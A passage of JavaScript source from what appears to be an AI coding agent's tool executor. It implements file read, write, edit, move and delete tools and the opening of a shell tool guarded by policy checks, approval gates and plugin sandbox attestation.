    // (spawn_sub_agent / isolated run_skill) as their parent_id.
    hookTraceId = null,
    skillLifecycleMode = "active",
    nonBlockingShell = false,
  },
) {
  const localToolDescriptor =
    externalToolDescriptors && typeof externalToolDescriptors === "object"
      ? externalToolDescriptors[name] || null
      : null;
  const runtimeDescriptor =
    getRuntimeToolDescriptor(name) || localToolDescriptor;
  // Subagent skill capability INTERSECT: null = unrestricted; a list (possibly
  // empty) restricts which skills run_skill/list_skills expose in this loop.
  const _skillAllowlist = Array.isArray(skillAllowlist) ? skillAllowlist : null;
  const skillAllowed = (s) =>
    !_skillAllowlist ||
    _skillAllowlist.includes(s.id) ||
    _skillAllowlist.includes(s.dirName);
  const hostToolPolicies =
    hostManagedToolPolicy?.tools || hostManagedToolPolicy?.toolPolicies || null;
  const hostToolPolicy =
    hostToolPolicies && typeof hostToolPolicies === "object"
      ? hostToolPolicies[name]
      : null;
  const hostToolDefinition = Array.isArray(
    hostManagedToolPolicy?.toolDefinitions,
  )
    ? hostManagedToolPolicy.toolDefinitions.find(
        (tool) => tool?.function?.name === name,
      ) || null
    : null;
  const buildPayload = (descriptor) =>
    descriptor
      ? {
          name: descriptor.name,
          kind: descriptor.kind || descriptor.category || descriptor.source,
          category: descriptor.category,
        }
      : null;
  const descriptorPayload = buildPayload(runtimeDescriptor);
  const attachDescriptor = (payload, overrideDescriptor = null) => {
    const descriptor = buildPayload(overrideDescriptor || runtimeDescriptor);
    return descriptor ? { ...payload, toolDescriptor: descriptor } : payload;
  };
  const localToolExecutor =
    externalToolExecutors && typeof externalToolExecutors === "object"
      ? externalToolExecutors[name] || null
      : null;
  switch (name) {
    case "read_file": {
      const filePath = path.resolve(cwd, args.path);
      if (!fs.existsSync(filePath)) {
        return attachDescriptor({ error: `File not found: ${filePath}` });
      }
      // A clear, self-correcting error beats the cryptic "EISDIR: illegal
      // operation on a directory" that readFileSync throws on a directory.
      if (fs.statSync(filePath).isDirectory()) {
        return attachDescriptor({
          error: `Path is a directory, not a file: ${filePath}. Use list_dir to see its contents.`,
        });
      }
      const content = fs.readFileSync(filePath, "utf8");
      // Record the mtime so a later edit can detect an external change that
      // happened between this read and the edit (read-freshness guard).
      _recordFileObservation(filePath);
      // Jupyter notebooks: render a compact cell listing (index/id/type/source,
      // outputs summarized) so the model can find cells for notebook_edit
      // without ingesting raw JSON / base64 output blobs. `raw:true` returns the
      // underlying JSON. Non-.ipynb reads are unchanged.
      if (args.raw !== true && /\.ipynb$/i.test(filePath)) {
        const nbView = renderNotebook(content);
        if (nbView) {
          return attachDescriptor(
            nbView.length > 50000
              ? {
                  content: nbView.substring(0, 50000) + "\n...(truncated)",
                  size: nbView.length,
                  notebook: true,
                }
              : { content: nbView, notebook: true },
          );
        }
      }
      // Hashline mode: prefix each line with a 6-char content hash tag
      // so downstream edit_file_hashed calls can anchor by hash.
      let rendered = args.hashed === true ? annotateLines(content) : content;

      // Line-range slice (Claude-Code Read offset/limit parity): `offset` is the
      // 1-based first line, `limit` the max line count — so a file larger than
      // the size cap can be paged through instead of being stuck at its head.
      // Coerces numeric strings the model may emit ("10" → 10).
      const toPos = (v) => {
        const n = typeof v === "number" ? v : parseInt(v, 10);
        return Number.isInteger(n) && n > 0 ? n : null;
      };
      const offset = toPos(args.offset);
      const limit = toPos(args.limit);
      let range = null;
      if (offset || limit) {
        const lines = rendered.split("\n");
        const start = offset ? offset - 1 : 0;
        const end = limit != null ? start + limit : lines.length;
        rendered = lines.slice(start, end).join("\n");
        range = {
          startLine: Math.min(start + 1, lines.length),
          endLine: Math.min(end, lines.length),
          totalLines: lines.length,
        };
      }

      if (rendered.length > 50000) {
        return attachDescriptor(
          await _withSubtreeInstructions(
            {
              content: rendered.substring(0, 50000) + "\n...(truncated)",
              size: rendered.length,
              hashed: args.hashed === true,
              ...(range ? { range } : {}),
            },
            filePath,
            cwd,
            subtreeInstructionScope,
          ),
        );
      }
      return attachDescriptor(
        await _withSubtreeInstructions(
          {
            content: rendered,
            hashed: args.hashed === true,
            ...(range ? { range } : {}),
          },
          filePath,
          cwd,
          subtreeInstructionScope,
        ),
      );
    }

    case "write_file": {
      const sinkDenial = guardExactFileMutationScope(
        name,
        args,
        { fileMutationScope },
        cwd,
      );
      if (sinkDenial) return attachDescriptor(sinkDenial);
      const filePath = path.resolve(cwd, args.path);
      const dir = path.dirname(filePath);
      // Overwriting an existing file: refuse if it changed on disk since the
      // agent last observed it (external concurrent edit).
      if (fs.existsSync(filePath)) {
        const stale = _checkFileFreshness(filePath);
        if (stale) return attachDescriptor({ error: stale });
      }
      if (!fileMutationScope && !fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
      const wrote = fileMutationScope
        ? writeFileVerifiedWithinExactScope(
            fileMutationScope,
            args.path,
            args.content,
            cwd,
          )
        : writeFileVerified(filePath, args.content);
      if (wrote.error) return attachDescriptor(wrote);
      _recordFileObservation(filePath);
      return attachDescriptor(
        await _withSubtreeInstructions(
          await _withPostEditDiagnostics(
            { success: true, path: filePath, size: wrote.size },
            filePath,
            cwd,
            additionalDirectories,
            managedCheckpoint || hermeticExecution,
          ),
          filePath,
          cwd,
          subtreeInstructionScope,
        ),
      );
    }

    case "delete_file": {
      if (!args.path) {
        return attachDescriptor({ error: "path is required" });
      }
      const filePath = path.resolve(cwd, args.path);
      if (!fs.existsSync(filePath)) {
        return attachDescriptor({ error: `File not found: ${filePath}` });
      }
      if (fs.lstatSync(filePath).isDirectory()) {
        return attachDescriptor({
          error: `Refusing to delete a directory: ${filePath}`,
        });
      }
      const stale = _checkFileFreshness(filePath);
      if (stale) return attachDescriptor({ error: stale });
      fs.unlinkSync(filePath);
      _fileObservedMtimes.delete(filePath);
      return attachDescriptor({
        success: true,
        path: filePath,
        operation: "delete",
      });
    }

    case "move_file": {
      if (!args.path || !args.target_path) {
        return attachDescriptor({
          error: "path and target_path are required",
        });
      }
      const filePath = path.resolve(cwd, args.path);
      const targetPath = path.resolve(cwd, args.target_path);
      if (filePath === targetPath) {
        return attachDescriptor({
          error: "Source and target paths are the same",
        });
      }
      if (!fs.existsSync(filePath)) {
        return attachDescriptor({ error: `File not found: ${filePath}` });
      }
      if (fs.lstatSync(filePath).isDirectory()) {
        return attachDescriptor({
          error: `Refusing to move a directory: ${filePath}`,
        });
      }
      if (fs.existsSync(targetPath)) {
        return attachDescriptor({
          error: `Move target already exists: ${targetPath}`,
        });
      }
      const targetDir = path.dirname(targetPath);
      if (!fs.existsSync(targetDir) || !fs.statSync(targetDir).isDirectory()) {
        return attachDescriptor({
          error: `Move target directory not found: ${targetDir}`,
        });
      }
      const stale = _checkFileFreshness(filePath);
      if (stale) return attachDescriptor({ error: stale });
      fs.renameSync(filePath, targetPath);
      _fileObservedMtimes.delete(filePath);
      _recordFileObservation(targetPath);
      return attachDescriptor(
        await _withSubtreeInstructions(
          await _withPostEditDiagnostics(
            {
              success: true,
              path: filePath,
              targetPath,
              operation: "rename",
            },
            targetPath,
            cwd,
            additionalDirectories,
            managedCheckpoint,
          ),
          targetPath,
          cwd,
          subtreeInstructionScope,
        ),
      );
    }

    case "notebook_edit": {
      const filePath = path.resolve(cwd, args.path);
      if (!fs.existsSync(filePath)) {
        return attachDescriptor({ error: `Notebook not found: ${filePath}` });
      }
      const original = fs.readFileSync(filePath, "utf8");
      const res = editNotebookCell(original, args);
      if (res.error) return attachDescriptor({ error: res.error });
      const wrote = writeFileVerified(filePath, res.text);
      if (wrote.error) return attachDescriptor({ error: wrote.error });
      return attachDescriptor({
        success: true,
        path: filePath,
        size: wrote.size,
        summary: res.summary,
        cellId: res.cellId,
      });
    }

    case "edit_file": {
      const sinkDenial = guardExactFileMutationScope(
        name,
        args,
        { fileMutationScope },
        cwd,
      );
      if (sinkDenial) return attachDescriptor(sinkDenial);
      const filePath = path.resolve(cwd, args.path);
      if (!fs.existsSync(filePath)) {
        return attachDescriptor({ error: `File not found: ${filePath}` });
      }
      if (typeof args.old_string !== "string" || args.old_string === "") {
        return attachDescriptor({
          error: "old_string must be a non-empty string",
        });
      }
      if (typeof args.new_string !== "string") {
        return attachDescriptor({ error: "new_string must be a string" });
      }
      const staleEdit = _checkFileFreshness(filePath);
      if (staleEdit) return attachDescriptor({ error: staleEdit });
      const content = fs.readFileSync(filePath, "utf8");
      const replaceAll = args.replace_all === true;
      const { count, newContent } = applyLiteralEdit(
        content,
        args.old_string,
        args.new_string,
        replaceAll,
      );
      if (count === 0) {
        // Idempotent replay (P0-2 "Diff Apply 内容哈希"): a resumed edit whose
        // old_string is already gone but whose new_string is present already
        // landed. Report a no-op success (NO write occurs — zero data risk)
        // rather than a misleading "not found" error, so a recovered worker
        // doesn't get stuck re-issuing an edit that already happened.
        const replay = classifyEditReplay({
          content,
          oldString: args.old_string,
          newString: args.new_string,
        });
        if (replay === EDIT_REPLAY.ALREADY_APPLIED) {
          return attachDescriptor({
            success: true,
            path: filePath,
            alreadyApplied: true,
            idempotencyKey: editIdempotencyKey({
              path: args.path,
              oldString: args.old_string,
              newString: args.new_string,
              replaceAll,
            }),
            note: "edit already applied (new_string present, old_string absent) — no change made",
          });
        }
        return attachDescriptor({ error: "old_string not found in file" });
      }
      // Require a UNIQUE match (Claude-Code Edit parity) — replacing the first
      // of several identical strings silently edits the wrong occurrence.
      if (count > 1 && !replaceAll) {
        return attachDescriptor({
          error: `old_string is not unique — it appears ${count} times. Add surrounding context so it matches exactly one occurrence, or pass replace_all:true to change all of them.`,
          occurrences: count,
        });
      }
      const wrote = fileMutationScope
        ? writeFileVerifiedWithinExactScope(
            fileMutationScope,
            args.path,
            newContent,
            cwd,
          )
        : writeFileVerified(filePath, newContent);
      if (wrote.error) return attachDescriptor(wrote);
      _recordFileObservation(filePath);
      return attachDescriptor(
        await _withSubtreeInstructions(
          await _withPostEditDiagnostics(
            {
              success: true,
              path: filePath,
              size: wrote.size,
              replaced: replaceAll ? count : 1,
            },
            filePath,
            cwd,
            additionalDirectories,
            managedCheckpoint || hermeticExecution,
          ),
          filePath,
          cwd,
          subtreeInstructionScope,
        ),
      );
    }

    case "edit_file_hashed": {
      const sinkDenial = guardExactFileMutationScope(
        name,
        args,
        { fileMutationScope },
        cwd,
      );
      if (sinkDenial) return attachDescriptor(sinkDenial);
      // Hash-anchored edit (v5.0.2.9, inspired by oh-my-openagent).
      // Reference a line by its content hash rather than line number or
      // exact string — robust against whitespace drift and concurrent edits.
      const filePath = path.resolve(cwd, args.path);
      if (!fs.existsSync(filePath)) {
        return attachDescriptor({ error: `File not found: ${filePath}` });
      }
      if (!args.anchor_hash || typeof args.anchor_hash !== "string") {
        return attachDescriptor({
          error: "anchor_hash is required",
          hint: "Read the file with hashed:true to get line hashes",
        });
      }
      if (typeof args.new_line !== "string") {
        return attachDescriptor({ error: "new_line must be a string" });
      }
      const staleHashed = _checkFileFreshness(filePath);
      if (staleHashed) return attachDescriptor({ error: staleHashed });
      const original = fs.readFileSync(filePath, "utf8");
      const result = replaceByHash(original, {
        anchorHash: args.anchor_hash,
        expectedLine: args.expected_line,
        newLine: args.new_line,
      });
      if (!result.success) {
        // Self-healing hint: include a fresh annotated snippet when possible
        const snippet =
          result.error === "ambiguous_anchor" && result.matches?.[0]
            ? snippetAround(original, result.matches[0].lineNumber - 1)
            : null;
        return attachDescriptor({
          error: result.error,
          message: result.message,
          hint: result.hint,
          ...(result.matches && { matches: result.matches }),
          ...(result.current && { current: result.current }),
          ...(result.expected && { expected: result.expected }),
          ...(snippet && { current_snippet: snippet }),
        });
      }
      const wrote = fileMutationScope
        ? writeFileVerifiedWithinExactScope(
            fileMutationScope,
            args.path,
            result.content,
            cwd,
          )
        : writeFileVerified(filePath, result.content);
      if (wrote.error) return attachDescriptor(wrote);
      _recordFileObservation(filePath);
      return attachDescriptor(
        await _withSubtreeInstructions(
          await _withPostEditDiagnostics(
            {
              success: true,
              path: filePath,
              size: wrote.size,
              lineNumber: result.lineNumber,
              previousContent: result.previousContent,
            },
            filePath,
            cwd,
            additionalDirectories,
            managedCheckpoint || hermeticExecution,
          ),
          filePath,
          cwd,
          subtreeInstructionScope,
        ),
      );
    }

    case "run_shell": {
      // Bound the declared run_shell data once. Approval and dispatch never
      // observe later mutation of the caller-owned tool arguments.
      args = Object.isFrozen(args) ? args : snapshotShellExecutionArgs(args);
      if (unattendedActionPolicy?.unattended === true) {
        const unattendedVerdict = evaluateUnattendedShellAction(args.command, {
          ...unattendedActionPolicy,
          attended: false,
        });
        if (!unattendedVerdict.allow) {
          return attachDescriptor({
            error: `[Unattended Action] ${unattendedVerdict.reason}; shell command was not run.`,
            unattendedAction: {
              actionClass: unattendedVerdict.actionClass || null,
              ...unattendedVerdict,
            },
            policy: { decision: "deny", via: "unattended-action-policy" },
          });
        }
      }

      const shellPolicyOpts = Object.freeze({
        ...(shellPolicyOverrides
          ? { overrideRuleIds: Object.freeze([...shellPolicyOverrides]) }
          : {}),
        ...(classifyAllShell ? { classifyAllShell: true } : {}),
      });
      // Layer-by-layer explanation chain for a blocked command: which layers
      // were consulted and what each said (settings rules → shell policy →
      // approval gate). Attached to denial results so `/permissions denials`
      // and `cc permissions recent` can explain WHY, not just THAT.
      const buildPermissionChain = (gated) => {
        const chain = [
          {
            layer: "settings-rules",
            outcome:
              settingsVerdict?.decision || (ruleAllowed ? "allow" : "no-match"),
            rule: settingsVerdict?.rule || null,
          },
          {
            layer: "shell-policy",
            outcome: shellPolicy?.decision || null,
            rule: shellPolicy?.ruleId || null,
            reason: shellPolicy?.reason || null,
          },
        ];
        // A hard shell-policy deny returns before the gate is consulted
        // (via === "shell-policy") — no approval-gate layer to explain then.
        if (gated && gated.via !== "shell-policy") {
          chain.push({
            layer: "approval-gate",
            outcome: gated.decision,
            via: gated.via || null,
            policy: gated.policy || null,
            riskLevel: gated.riskLevel || null,
            rule: gated.gateRule || null,
            reason: gated.gateReason || null,
          });
        }
        return chain;
      };
      const override = getRuntimeToolDescriptorByCommand(args.command);
      let shellPolicy = evaluateShellCommandPolicy(
        args.command,
        shellPolicyOpts,
      );
      let approvalOutcome = null;
      let approvalAuthorization = null;
      let approvalAuthorizationContext = null;
      let approvalGateResult = null;
      // A settings `allow` rule (ruleAllowed) pre-authorizes: skip the
      // ApprovalGate tier confirm, but still run the hard shell-policy denylist
      // below so an allow rule can never re-enable a blocked unsafe command.
      const requestShellApproval = async (operationArgs) => {
        await shellDispatchPolicyAuthority?.revalidate?.();
        if (!ruleAllowed) {
          const approvalPolicyVersion = `${shellDispatchPolicyAuthority?.policyVersion || "cc-shell-policy-authority/v1:unobserved"}:shell:${shellPolicy.decision}:${shellPolicy.ruleId || "none"}`;
          const gated = await evaluateShellCommandWithApproval({
            command: args.command,
            args: operationArgs,
            sessionId,
            approvalGate,
            shellPolicyOptions: shellPolicyOpts,
            workspace: args.cwd || cwd,
            policyEnv: shellParentEnvironment,
            policyVersion: approvalPolicyVersion,
            deferSideEffects: true,
          });
          approvalGateResult = gated;
          shellPolicy = gated.shellPolicy;
          approvalOutcome = {
            decision: gated.decision,
            via: gated.via,
            riskLevel: gated.riskLevel,
            policy: gated.policy,
          };
          approvalAuthorization = gated.authorization;
          approvalAuthorizationContext = gated.authorizationContext;
          if (!gated.allowed) {
            // Make a policy denial ACTIONABLE for the model (Claude-Code 2.1.193
            // "denial reasons to transcripts"): tell it this won't change on
            // retry and to involve the user, so it stops re-issuing the same
            // blocked command (which otherwise just burns turns + tokens).
            const tierLabel =
              typeof gated.policy === "string" ? `"${gated.policy}" ` : "";
            return attachDescriptor(
              {
                error:
                  gated.via === "shell-policy"
                    ? `[Shell Policy] ${gated.reason} This command is blocked by policy and will not run — do not retry it; find another approach.`
                    : `[ApprovalGate] command denied by the ${tierLabel}approval policy (via ${gated.via}). Retrying the same command will not help — it needs user approval. Tell the user (they can run it themselves, approve it, or relax the policy) and continue with other work.`,
                shellCommandPolicy: shellPolicy,
                approval: approvalOutcome,
                permissionChain: buildPermissionChain(gated),
              },
              override || runtimeDescriptor,
            );
          }
        } else {
          shellPolicy = evaluateShellCommandPolicy(
            args.command,
            shellPolicyOpts,
          );
          if (!shellPolicy.allowed) {
            return attachDescriptor(
              {
                error: `[Shell Policy] ${shellPolicy.reason} This command is blocked by policy and will not run — do not retry it; find another approach.`,
                shellCommandPolicy: shellPolicy,
                permissionChain: buildPermissionChain(null),
              },
              override || runtimeDescriptor,
            );
          }
        }
        return null;
      };

      // P1 #8 Windows/PowerShell first-class: per-call args.shell or the
      // configured settings `shell.windowsDefault` may route this command
      // through PowerShell via explicit argv (`powershell.exe -NoProfile
      // [-ExecutionPolicy <p>] -Command <cmd>`). The unconfigured path keeps
      // the historical default shell byte-identical (useDefaultShell=true).
      const { resolveShellInvocation } =
        await import("../lib/shell-selector.cjs");
      let shellInv = resolveShellInvocation({
        command: args.command,
        requested: args.shell,
        cwd: args.cwd || cwd,
      });
      const shellMeta = shellInv.useDefaultShell
        ? shellInv.note
          ? { shell_note: shellInv.note }
          : {}
        : { shell: shellInv.kind };

      // Policy-bearing plugin bins never enter PATH. Their declared alias is
      // accepted only as one direct command: resolve it to literal argv, attest
      // the exact target, then give Broker an absolute command with shell:false.
      // Resolver failures for a matching strict alias are terminal — falling
      // back to a shell would bypass target identity and manifest requirements.
      let pluginBinInvocation = null;
      let pluginBinRuntime = null;
      let pluginBinSandboxPolicy = null;
      let pluginBinSandboxExecutionContract = null;
      const backgroundPlatform =
        typeof _backgroundProcessDeps.platform === "function"
          ? _backgroundProcessDeps.platform()
          : process.platform;
      try {
        const pluginBin = await import("../lib/plugin-runtime/bin.js");
        pluginBinRuntime = pluginBin;
        pluginBinSandboxPolicy = collectWorkspacePluginBinSandboxPolicy(
          pluginBin,
          cwd,
          args.cwd || cwd,
        );
        pluginBinInvocation = pluginBin.resolvePluginBinInvocation(
          args.command,
          {
            cwd,
            commandCwd: args.cwd || cwd,
          },
        );
        if (pluginBinInvocation?.sandboxPolicy) {
          pluginBinSandboxPolicy = pluginBin.pinPluginBinSandboxPolicy(
            {
              requiredBoundaries: [
                ...(pluginBinSandboxPolicy?.requiredBoundaries || []),
                ...(pluginBinInvocation.sandboxPolicy.requiredBoundaries || []),
              ],
            },
            { cwd },
          );
          if (
            pluginBinInvocation.runtime === "native" &&
            backgroundPlatform !== "linux"
          ) {
            const unsupportedNativeError = new Error(
              `strict native Plugin bins require the Linux descriptor-bound ELF loader closure; ${backgroundPlatform} native loading is unsupported`,
            );
            unsupportedNativeError.code =
              "ERR_PLUGIN_NATIVE_SANDBOX_PLATFORM_UNSUPPORTED";
            unsupportedNativeError.pluginBinFailClosed = true;
            throw unsupportedNativeError;
          }
          if (
            backgroundPlatform === "linux" ||
            (backgroundPlatform === "win32" &&
              pluginBinInvocation.runtime === "node")
          ) {
            try {
              pluginBinSandboxExecutionContract =
                pluginBin.createPluginSandboxExecutionContract(
                  pluginBinInvocation,
                  { sync: args.run_in_background !== true },
                );
            } catch (error) {
              if (error?.pluginBinFailClosed) throw error;
              const contractError = new Error(
                `plugin sandbox execution contract could not be created: ${error.message}`,
              );
              contractError.code = "ERR_PLUGIN_SANDBOX_CONTRACT_UNATTESTED";
              contractError.pluginBinFailClosed = true;
              throw contractError;
            }
          }
        }
      } catch (err) {
        if (err?.pluginBinFailClosed) {
          const policyVia =
            err.code === "ERR_PLUGIN_BIN_DISCOVERY_FAILED"
              ? "plugin-bin-pinned-sandbox-policy"
              : "plugin-bin-direct-invocation";
          return attachDescriptor(
            {
              error: `[Plugin bin] ${err.message}`,
              policy: {
                decision: "deny",
                via: policyVia,
                reason: err.code || "plugin_bin_resolution_failed",
              },
              shellCommandPolicy: shellPolicy,
              approval: approvalOutcome,
            },
            override || runtimeDescriptor,
          );
        }
        pluginBinInvocation = null;
      }
      const processOrigin = pluginBinInvocation
        ? "plugin:bin"
        : "tool:run_shell";
      let processProvenance = {
        ...(pluginBinInvocation
          ? {
              pluginId: pluginBinInvocation.pluginId,
              pluginVersion: pluginBinInvocation.pluginVersion,
              pluginSource: pluginBinInvocation.pluginSource,
              pluginExecutableIdentity: pluginBinInvocation.executableIdentity,
            }
          : {}),
        ...(pluginBinSandboxPolicy
          ? { sandboxPolicy: pluginBinSandboxPolicy }
          : {}),
        ...(pluginBinSandboxExecutionContract
          ? {
              sandboxExecutionContract: pluginBinSandboxExecutionContract,
            }
          : {}),
      };
      const pluginBinResult = pluginBinInvocation
        ? {
            plugin_bin: {
              plugin: pluginBinInvocation.pluginId,
              version: pluginBinInvocation.pluginVersion,
              name: pluginBinInvocation.binName,
              target: pluginBinInvocation.binPath,
              runtime: pluginBinInvocation.runtime,
              sha256: pluginBinInvocation.executableIdentity.sha256,
              identity_attested: true,
              launch_identity_reattested: false,
              direct_argv: true,
            },
          }
        : {};

      // Snapshot process-derived execution inputs before confirmation. The
      // descriptor carries only an opaque, secret-free environment reference;
      // the actual child environment remains in this invocation-local closure.
      const shellParentEnvironment = Object.freeze({ ...process.env });
      const agentIdentityEnvironment = Object.freeze({
        CLAUDECODE: "1",
        ...(sessionId
          ? {
              CC_SESSION_ID: String(sessionId),
              CLAUDE_CODE_SESSION_ID: String(sessionId),
            }
          : {}),
      });
      const credentialProxyResult = applyCredentialProxy(
        {
          ...shellParentEnvironment,
          ...agentIdentityEnvironment,
        },
        { env: shellParentEnvironment },
      );
      const shellChildEnvironment = Object.freeze({
        ...credentialProxyResult.env,
      });
      const sandboxChildEnvironment = agentIdentityEnvironment;
      const shellExecutionDescriptor = createShellExecutionDescriptor({
        args,
        workspace: args.cwd || cwd,
        shellInvocation: shellInv,
        pluginInvocation: pluginBinInvocation,
        pluginSandboxPolicy: pluginBinSandboxPolicy,
        pluginSandboxExecutionContract: pluginBinSandboxExecutionContract,
        sandbox,
        environmentRef: {
          id: `run-shell-env:${randomUUID()}`,
          inheritance: sandbox ? "sandbox-minimal" : "host-snapshot",
          credentialProxy: credentialProxyResult.enabled === true,
          maskedNames: Object.freeze([...credentialProxyResult.masked]),
        },
      });
      // From here onward the descriptor itself is the tool-argument snapshot.
      args = shellExecutionDescriptor;
      shellInv = shellExecutionDescriptor.execution.shell;
      const shellSandbox = shellExecutionDescriptor.execution.sandbox;
      const executionPlugin = shellExecutionDescriptor.execution.plugin;
      const approvedPluginProjection = executionPlugin
        ? canonicalPolicyAuthorityData(executionPlugin)
        : null;
      const approvedWorkspacePluginPolicy = canonicalPolicyAuthorityData(
        pluginBinSandboxPolicy,
      );
      const approvedPluginInvocationAuthority = pluginBinInvocation
        ? canonicalPolicyAuthorityData(
            projectPluginBinInvocationAuthority(pluginBinInvocation),
          )
        : null;
      const refreshPluginBinExecution = () => {
        if (!executionPlugin) return;
        if (!pluginBinRuntime) {
          const error = new Error(
            "Plugin bin runtime is unavailable during launch revalidation",
          );
          error.code = "ERR_PLUGIN_BIN_DISCOVERY_FAILED";
          error.pluginBinFailClosed = true;
          throw error;
        }
        const freshInvocation = pluginBinRuntime.resolvePluginBinInvocation(
          shellExecutionDescriptor.command,
          {
            cwd,
            commandCwd: shellExecutionDescriptor.cwd || cwd,
            failClosed: true,
          },
        );
        if (!freshInvocation) {
          const error = new Error(
            "Approved plugin bin alias is no longer available",
          );
          error.code = "ERR_PLUGIN_BIN_LAUNCH_AUTHORITY_CHANGED";
          error.pluginBinFailClosed = true;
          throw error;
        }
        if (
          canonicalPolicyAuthorityData(
            projectPluginBinInvocationAuthority(freshInvocation),
          ) !== approvedPluginInvocationAuthority
        ) {
          const error = new Error(
            "Plugin bin manifest, trust, alias, or sandbox authority changed after approval",
          );
          error.code = "ERR_PLUGIN_BIN_LAUNCH_AUTHORITY_CHANGED";
          error.pluginBinFailClosed = true;
          throw error;
        }
        let freshPolicy = collectWorkspacePluginBinSandboxPolicy(
          pluginBinRuntime,
          cwd,
          shellExecutionDescriptor.cwd || cwd,
        );
        if (freshInvocation.sandboxPolicy) {
          freshPolicy = pluginBinRuntime.pinPluginBinSandboxPolicy(
            {
              requiredBoundaries: [
                ...(freshPolicy?.requiredBoundaries || []),
                ...(freshInvocation.sandboxPolicy.requiredBoundaries || []),
              ],
            },
            { cwd },
          );
        }
        let freshContract = null;
        if (
          freshInvocation.sandboxPolicy &&
          (backgroundPlatform === "linux" ||
            (backgroundPlatform === "win32" &&
              freshInvocation.runtime === "node"))
        ) {
          freshContract = pluginBinRuntime.createPluginSandboxExecutionContract(
            freshInvocation,
            { sync: shellExecutionDescriptor.run_in_background !== true },
          );
        }
        const freshProjection = createShellExecutionDescriptor({
          args: shellExecutionDescriptor,
          workspace: shellExecutionDescriptor.execution.workspace,
          shellInvocation: shellExecutionDescriptor.execution.shell,
          pluginInvocation: freshInvocation,
          pluginSandboxPolicy: freshPolicy,
          pluginSandboxExecutionContract: freshContract,
          sandbox: shellExecutionDescriptor.execution.sandbox,
          environmentRef: shellExecutionDescriptor.execution.environment,
        }).execution.plugin;
        if (
          canonicalPolicyAuthorityData(freshProjection) !==
          approvedPluginProjection
        ) {
          const error = new Error(
            "Plugin bin manifest, trust, alias, or sandbox authority changed after approval",
          );
          error.code = "ERR_PLUGIN_BIN_LAUNCH_AUTHORITY_CHANGED";
          error.pluginBinFailClosed = true;
          throw error;
        }
        pluginBinInvocation = freshInvocation;
        pluginBinSandboxPolicy = freshPolicy;
        pluginBinSandboxExecutionContract = freshContract;
        processProvenance = {
          pluginId: freshInvocation.pluginId,
          pluginVersion: freshInvocation.pluginVersion,
          pluginSource: freshInvocation.pluginSource,
          pluginExecutableIdentity: freshInvocation.executableIdentity,
          ...(freshPolicy ? { sandboxPolicy: freshPolicy } : {}),
          ...(freshContract ? { sandboxExecutionContract: freshContract } : {}),
        };
      };
      const refreshPluginExecutionAuthority = () => {
        if (executionPlugin) {
          refreshPluginBinExecution();
          return;
        }
        if (!pluginBinRuntime) return;
        const freshPolicy = collectWorkspacePluginBinSandboxPolicy(
          pluginBinRuntime,
          cwd,
          shellExecutionDescriptor.cwd || cwd,
        );
        if (
          canonicalPolicyAuthorityData(freshPolicy) !==
          approvedWorkspacePluginPolicy
        ) {
          const error = new Error(
            "Workspace plugin sandbox authority changed after approval",
          );
          error.code = "ERR_PLUGIN_BIN_LAUNCH_AUTHORITY_CHANGED";
          error.pluginBinFailClosed = true;
          throw error;
        }
        pluginBinSandboxPolicy = freshPolicy;
        processProvenance = freshPolicy ? { sandboxPolicy: freshPolicy } : {};
      };

      const approvalDenial = await requestShellApproval(
        shellExecutionDescriptor,
      );
      if (approvalDenial) return approvalDenial;

      const createShellProcessAuditContext = () => {
        const authorization = approvalOutcome || {
          decision: "allow",
          via: ruleAllowed ? "settings-rule" : "shell-policy",
          riskLevel: null,
          policy: null,
        };
        const policyDigest = createHash("sha256")
          .update(
            JSON.stringify({
              authorityVersion:
                shellDispatchPolicyAuthority?.policyVersion || null,
              shellDecision: shellPolicy.decision || null,
              shellRuleId: shellPolicy.ruleId || null,
              authorization,
            }),
            "utf8",
          )
          .digest("hex");
        return Object.freeze({
          actor: "agent",
          sessionId: sessionId ? String(sessionId) : null,
          authorization: Object.freeze({ ...authorization }),
          policyDigest,
        });
      };
      const shellProcessAuditRedactArgIndexes = () => {
        const auditArgs = pluginBinInvocation
          ? executionPlugin?.argv
          : shellInv.useDefaultShell
            ? []
            : shellInv.argv;
        return Array.isArray(auditArgs)
          ? auditArgs.map((_, index) => index)
          : [];
      };

      let shellDispatchAdmitted = false;
      const admitShellDispatch = async () => {
        if (shellDispatchAdmitted) {
          throw new Error("Shell dispatch authorization was already consumed");
        }
        await shellDispatchPolicyAuthority?.revalidate?.();
        refreshPluginExecutionAuthority();
        const revalidated = evaluateShellCommandPolicy(
          shellExecutionDescriptor.command,
          shellPolicyOpts,
        );
        if (
          !revalidated.allowed ||
          revalidated.decision !== shellPolicy.decision ||
          (revalidated.ruleId || null) !== (shellPolicy.ruleId || null)
        ) {
          const error = new Error(
            "Shell policy changed after approval; command dispatch was denied",
          );
          error.code = "ERR_SHELL_POLICY_REVALIDATION_FAILED";
          throw error;
        }
        if (approvalAuthorization) {
          if (typeof approvalGate?.consumeAuthorization !== "function") {
            throw new Error(
              "Remote shell approval cannot be consumed by this ApprovalGate",
            );
          }
          await approvalGate.consumeAuthorization(
            approvalAuthorization,
            approvalAuthorizationContext,
          );
          approvalAuthorization = null;
        }
        await shellDispatchPolicyAuthority?.revalidate?.();
        refreshPluginExecutionAuthority();
        const finalPolicy = evaluateShellCommandPolicy(
          shellExecutionDescriptor.command,
          shellPolicyOpts,
        );
        if (
          !finalPolicy.allowed ||
          finalPolicy.decision !== shellPolicy.decision ||
          (finalPolicy.ruleId || null) !== (shellPolicy.ruleId || null)
        ) {
          const error = new Error(
            "Shell policy changed while authorization was consumed; command dispatch was denied",
          );
          error.code = "ERR_SHELL_POLICY_REVALIDATION_FAILED";
          throw error;
        }
        // Auditing is intentionally committed only after durable authorization
        // consumption and immediately before the first external side effect.
        commitShellApprovalSideEffects(approvalGateResult);
        if (pluginBinInvocation) {
          pluginBinResult.plugin_bin.launch_identity_reattested = true;
        }
        shellDispatchAdmitted = true;
      };

      // Background: spawn, register, return a task_id immediately. The agent
      // polls output + completion via check_shell. No timeout — that's the whole
      // point of backgrounding (builds, test suites, dev servers).
      if (args.run_in_background === true) {
        if (shellSandbox) {
          return attachDescriptor({
            error:
              "[Sandbox] Background shell tasks are not supported in the ephemeral sandbox. Run in the foreground or explicitly disable --sandbox.",
            policy: { decision: "deny", via: "sandbox" },
          });
        }
        const pinnedBackgroundBoundaries = [
          ...(pluginBinSandboxPolicy?.requiredBoundaries || []),
        ];
        const hasPinnedBackgroundPolicy = pinnedBackgroundBoundaries.length > 0;
        const linuxGenericStrongBackground =
          backgroundPlatform === "linux" &&
          !pluginBinInvocation &&
